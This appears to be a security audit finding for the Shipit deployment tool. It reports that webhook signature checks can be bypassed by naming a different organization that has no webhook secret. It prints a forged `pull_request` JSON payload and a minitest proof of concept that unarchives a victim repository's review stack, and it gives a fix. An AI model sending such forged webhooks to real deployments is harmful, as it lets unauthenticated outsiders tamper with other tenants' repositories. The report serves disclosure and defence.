### Title
Forged `pull_request`/`reopened` webhook verified against attacker-chosen (no-secret) organization mutates a victim repository's review stack - (File: app/controllers/shipit/webhooks_controller.rb)

### Summary
`Shipit::WebhooksController#repository_owner` selects the signature-verifying GitHub App organization from `params.dig('repository','owner','login') || params.dig('organization','login')`, while every `pull_request` handler (e.g. `ReopenedHandler`) resolves the target repository independently from `params.repository.full_name`. Because these are two independently attacker-controlled fields, an attacker can supply a payload whose `repository.full_name` names a victim repo while `repository.owner.login` is omitted and `organization.login` names an org configured with no `webhook_secret`, causing `verify_webhook_signature` to accept any signature and the `ReopenedHandler`/`ReviewStackAdapter` to unarchive/create the victim's review stack.

### Finding Description
The broken binding claimed is: `repository_owner used to verify signature == organization that owns repository.full_name used by handler`. Tracing the code shows this is not enforced.

- `WebhooksController#repository_owner` (app/controllers/shipit/webhooks_controller.rb:59-62) computes the verifying org: `params.dig('repository','owner','login') || params.dig('organization','login')`.
- `verify_signature` (lines 24-49) calls `Shipit.github(organization: repository_owner)` and `github_app.verify_webhook_signature(signature, raw_post)`.
- `GitHubApp#verify_webhook_signature` (lib/shipit/github_app.rb:76-83): `return true unless webhook_secret` — i.e. if the selected organization has no configured `webhook_secret`, **any** signature (or none) verifies successfully. This is the "lenient verifier."
- `Shipit::Webhooks.for_event('pull_request')` (app/models/shipit/webhooks.rb:9-18) fans the parsed body out to `ReopenedHandler`, `OpenedHandler`, `ClosedHandler`, `LabelCapturingHandler`, etc.
- `ReopenedHandler#repository` and `#stack` (app/models/shipit/webhooks/handlers/pull_request/reopened_handler.rb:49-59) resolve the target repo via `Shipit::Repository.from_github_repo_name(params.repository.full_name)` — a completely separate field from the one used for `repository_owner`. `ReviewStackAdapter#unarchive!`/`create!` then create or unarchive a `ReviewStack` scoped to that repository, keyed only by `environment: "pr#{params.number}"`.

Attack payload: an unprivileged attacker sends `POST /webhooks` with header `X-Github-Event: pull_request` and a JSON body such as:
```json
{
  "action": "reopened",
  "number": 1,
  "pull_request": { ... valid schema fields ..., "head": {"ref": "attacker-branch", "sha": "..."}, "labels": [] },
  "repository": { "full_name": "victim-org/victim-repo" },
  "organization": { "login": "no-secret-org" },
  "sender": { "login": "attacker" }
}
```
`repository.owner.login` is intentionally omitted, so `repository_owner` falls back to `organization.login = "no-secret-org"`. If `no-secret-org` is configured in `config/secrets.yml` (any organization Shipit is configured to serve, potentially with `webhook_secret: nil` — as shown in the repo's own sample configs, e.g. `config/secrets.development.shopify.yml:9,18` and `test/dummy/config/secrets.yml:13`, which is a documented/permitted configuration shape, not an edge case), `verify_webhook_signature` returns `true` regardless of signature. The request passes `verify_signature`, and `ReopenedHandler` then acts on `Shipit::Repository.from_github_repo_name("victim-org/victim-repo")`, unarchiving/creating a PR-scoped review stack for the victim repo — a repository the attacker never authenticated for.

Existing guards do not stop this: `drop_unhandled_event` only checks the event name is registered; the `ExplicitParameters` schema on `ReopenedHandler` only requires `repository.full_name` to be a `String`, not that it match `repository.owner.login` or `organization.login`; `GithubOrganizationUnknown` is only raised if the org name given to `Shipit.github` isn't configured at all — it does nothing to bind the org to the repo referenced by the handler.

### Impact Explanation
A payload that only authenticates as (or against) one organization's app config causes the write to land against a *different* repository's `ReviewStack`/`PullRequest` records, matching the "Critical - payload for one repository mutating another's stack" category. The attacker can unarchive an archived review stack, force creation of a new review stack/`ReviewStackProvisioningQueue` entry, or (via other PR handlers fanned out from the same event, e.g. `LabelCapturingHandler`, `ClosedHandler`) mutate labels or archive/deprovision the victim's stack — all cross-tenant, repeatable for any repo name known to the attacker and for any Shipit-configured organization that has no `webhook_secret` set.

### Likelihood Explanation
Preconditions: the Shipit instance must have at least one configured GitHub App organization entry with `webhook_secret` empty/nil (a configuration shown as valid in this repo's own example/dummy secrets files) or the attacker must otherwise be able to omit `repository.owner.login` while some org's app has a lenient/absent secret. Given that, the attacker needs no credentials, no session, no GitHub App key — just the ability to send an unauthenticated HTTP POST to `/webhooks` with a crafted JSON body and event header. This is trivially repeatable against arbitrary target repository names.

### Recommendation
Bind the verifying organization strictly to the repository the handlers will act on: derive `repository_owner` only from `repository.owner.login` (reject/422 if absent, rather than falling back to `organization.login`), and additionally validate, before dispatch, that `params.dig('repository','full_name')`'s owner matches the verified `repository_owner`. Also do not treat an absent `webhook_secret` as an "always verify" bypass — require an explicit secret per configured organization, or reject events with no configured secret rather than treating them as verified.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_test.rb (illustrative minitest addition)
test "pull_request reopened forged via organization fallback mutates victim repo stack" do
  victim_repo = shipit_repositories(:shipit) # e.g. "shopify/shipit-engine"
  victim_repo.update!(review_stacks_enabled: true, provisioning_behavior: :allow_all)
  stack = Shipit::ReviewStack.create!(repository: victim_repo, environment: "pr1", branch: "main")
  stack.archive!(shipit_users(:codertocat))
  assert stack.archived?

  payload = payload_parsed(:pull_request_reopened)
  payload.delete("organization")
  payload["repository"] = { "full_name" => victim_repo.github_repo_name } # no "owner" key
  payload["organization"] = { "login" => "no-secret-org" } # org configured w/ webhook_secret: nil
  payload["number"] = 1

  Shipit.stubs(:github).with(organization: "no-secret-org").returns(
    Shipit::GitHubApp.new("no-secret-org", { webhook_secret: nil })
  )

  request.headers['X-Github-Event'] = 'pull_request'
  request.headers['X-Hub-Signature'] = 'sha1=deadbeef' # arbitrary/invalid signature

  post :create, body: payload.to_json, as: :json

  assert_response :ok
  assert_not stack.reload.archived?, "victim repo's review stack was unarchived by a payload verified against a different org"
end
```
Binding checked before/after: BEFORE — claimed equality `repository_owner (verifier) == owner_of(repository.full_name) (handler target)` is asserted by the code's intent but never enforced. AFTER — the test shows `repository_owner == "no-secret-org"` while the mutated record belongs to `victim_repo` owned by a different org, i.e. the equality is false, confirming the vulnerability. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L10-15)
```ruby
    def create
      params = JSON.parse(request.raw_post)
      Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }

      head(:ok)
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-49)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([
        'WebhookController#verify_signature',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",
        "status=#{status}"
      ].join(' '))
    rescue Shipit::GithubOrganizationUnknown => e
      head(422)
      Rails.logger.warn([
        'WebhookController#verify_signature',
        'Webhook from unknown organization',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "unknown_organization=#{e.message}",
        "status=#{status}"
      ].join(' '))
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** app/models/shipit/webhooks.rb (L9-18)
```ruby
          'pull_request' => [
            Handlers::PullRequest::OpenedHandler,
            Handlers::PullRequest::ClosedHandler,
            Handlers::PullRequest::ReopenedHandler,
            Handlers::PullRequest::EditedHandler,
            Handlers::PullRequest::AssignedHandler,
            Handlers::PullRequest::LabeledHandler,
            Handlers::PullRequest::UnlabeledHandler,
            Handlers::PullRequest::LabelCapturingHandler
          ],
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/reopened_handler.rb (L41-59)
```ruby
          def process
            return unless respond_to_pull_request_reopened?

            stack.unarchive!
          end

          private

          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end

          def stack
            @stack ||=
              Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks)
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L37-50)
```ruby
          def unarchive!(*args, &block)
            if stack.blank?
              Rails.logger.info(
                "Processing #{action} event for #{repo_name} PR #{pr_number} but no ReviewStack exists. Creating."
              )
              return create!
            end
            return unless stack.archived?

            stack.transaction do
              Shipit::ReviewStackProvisioningQueue.add(stack)
              stack.unarchive!(*args, &block)
            end
          end
```

**File:** config/secrets.development.shopify.yml (L1-23)
```yaml
host: 'shipit-engine.myshopify.io'

# For creating an app see: https://github.com/Shopify/shipit-engine/blob/main/docs/setup.md#creating-the-github-app

github:
  somegithuborg:
    app_id:
    installation_id:
    webhook_secret: # nil
    private_key:
    oauth:
      id:
      secret:
      teams:
  someothergithuborg:
    app_id:
    installation_id:
    webhook_secret: # nil
    private_key:
    oauth:
      id:
      secret:
      teams:
```

**File:** test/dummy/config/secrets.yml (L8-13)
```yaml
  github:
    domain: # defaults to github.com
    app_id: 42
    installation_id: 43
    bot_login: "shipit[bot]"
    webhook_secret: # nil
```
